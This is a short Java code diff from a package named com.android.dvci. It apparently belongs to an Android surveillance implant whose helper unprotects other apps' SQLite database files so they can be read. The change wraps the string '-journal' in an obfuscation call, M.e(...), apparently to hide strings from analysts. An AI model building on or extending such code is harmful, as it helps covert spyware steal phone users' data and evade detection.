@@ -9,6 +9,7 @@ import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
+import com.android.mm.M;
 
 import java.io.File;
 import java.io.IOException;
@@ -210,7 +211,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		}
 		try {
 			Path.unprotect(name, 3, true);
-			Path.unprotect(name + "-journal", true);
+			Path.unprotect(name + M.e("-journal"), true);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getReadableDatabase) open");
